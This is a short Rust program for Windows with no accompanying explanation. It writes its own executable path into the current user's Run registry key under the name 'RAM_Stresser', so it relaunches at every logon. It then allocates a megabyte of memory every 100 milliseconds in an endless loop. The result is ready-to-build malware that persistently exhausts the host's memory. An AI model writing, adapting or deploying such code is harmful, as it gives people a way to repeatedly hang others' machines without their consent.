use std::env;
use std::path::Path;
use std::thread;
use std::time::Duration;
use winreg::enums::*;
use winreg::RegKey;

fn main() {
    let key = r#"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"#;
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path = Path::new("Software")
        .join("Microsoft")
        .join("Windows")
        .join("CurrentVersion")
        .join("Run");
    let (key, disp) = hkcu.create_subkey(&path).unwrap();

    let current_exe = env::current_exe().unwrap();
    let exe_path = current_exe.display().to_string();

    key.set_value("RAM_Stresser", &exe_path).unwrap();

    let mut vec = Vec::new();
    loop {
        vec.push(vec![0u8; 1024 * 1024]);
        thread::sleep(Duration::from_millis(100));
    }
}
